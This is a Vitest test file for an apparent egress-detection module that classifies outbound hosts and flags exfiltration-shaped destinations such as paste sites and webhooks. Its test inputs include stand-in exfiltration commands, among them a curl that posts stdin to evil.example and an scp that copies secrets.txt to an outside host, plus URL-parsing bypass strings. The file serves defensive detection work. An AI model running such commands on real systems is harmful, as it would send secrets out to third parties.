import { describe, expect, it } from "vitest";
import {
  classifyDestination,
  extractHosts,
  isLocalHost,
  isNotableFirstSight,
} from "../main/lib/egress-intel.js";

describe("classifyDestination", () => {
  it("classifies known families by host suffix, unknown = generic", () => {
    expect(classifyDestination("api.openai.com").class).toBe("ai");
    expect(classifyDestination("pastebin.com").class).toBe("paste");
    expect(classifyDestination("webhook.site").class).toBe("webhook");
    expect(classifyDestination("my-bucket.s3.amazonaws.com").class).toBe("cloud_storage");
    expect(classifyDestination("registry.npmjs.org").class).toBe("package_registry");
    expect(classifyDestination("raw.githubusercontent.com").class).toBe("code_host");
    expect(classifyDestination("some-startup.example").class).toBe("generic");
  });

  it("matches on dotted suffix but not on a substring", () => {
    expect(classifyDestination("evil-openai.com.attacker.net").class).toBe("generic");
    expect(classifyDestination("openai.com").class).toBe("ai");
  });
});

describe("extractHosts", () => {
  it("pulls external URL and scp hosts, dropping local and private", () => {
    expect(extractHosts("curl -d @- https://evil.example/in && curl http://localhost:3000/x")).toEqual(["evil.example"]);
    expect(extractHosts("scp secrets.txt deploy@files.example.net:/tmp/")).toEqual(["files.example.net"]);
    expect(extractHosts("curl http://192.168.1.10/health")).toEqual([]);
    expect(extractHosts("no url here")).toEqual([]);
  });

  it("de-duplicates and strips ports", () => {
    expect(extractHosts("curl https://x.example:8443/a https://x.example/b")).toEqual(["x.example"]);
  });
});

describe("isLocalHost / isNotableFirstSight", () => {
  it("knows local and private hosts", () => {
    expect(isLocalHost("localhost")).toBe(true);
    expect(isLocalHost("127.0.0.1")).toBe(true);
    expect(isLocalHost("db.internal")).toBe(true);
    expect(isLocalHost("10.0.0.5")).toBe(true);
    expect(isLocalHost("api.openai.com")).toBe(false);
  });

  it("flags only the exfil-shaped classes on first sight, not everyday dev traffic", () => {
    expect(isNotableFirstSight("paste")).toBe(true);
    expect(isNotableFirstSight("webhook")).toBe(true);
    expect(isNotableFirstSight("file_share")).toBe(true);
    // Tracked but NOT flagged — too common in normal development to be a signal.
    expect(isNotableFirstSight("cloud_storage")).toBe(false);
    expect(isNotableFirstSight("generic")).toBe(false);
    expect(isNotableFirstSight("ai")).toBe(false);
    expect(isNotableFirstSight("code_host")).toBe(false);
    expect(isNotableFirstSight("package_registry")).toBe(false);
  });
});

describe("host extraction edge cases", () => {
  it("does not mistake hostnames for private networks, and parses the authority", async () => {
    const { extractHosts, isLocalHost } = await import("../main/lib/egress-intel.js");
    expect(isLocalHost("10.attacker.example")).toBe(false);
    expect(isLocalHost("192.168.attacker.example")).toBe(false);
    expect(isLocalHost("10.0.0.5")).toBe(true);
    expect(isLocalHost("[::1]:8080")).toBe(true);
    expect(extractHosts("curl https://evil.example#@localhost")).toEqual(["evil.example"]);
    expect(extractHosts("curl https://evil.example?a@localhost")).toEqual(["evil.example"]);
    expect(extractHosts("curl https://webhook.site?t=1 https://pastebin.com./x")).toEqual(["webhook.site", "pastebin.com"]);
    expect(extractHosts("websocat wss://relay.example/ws")).toEqual(["relay.example"]);
    expect(extractHosts("curl http://[::1]:8080/x")).toEqual([]);
  });
});
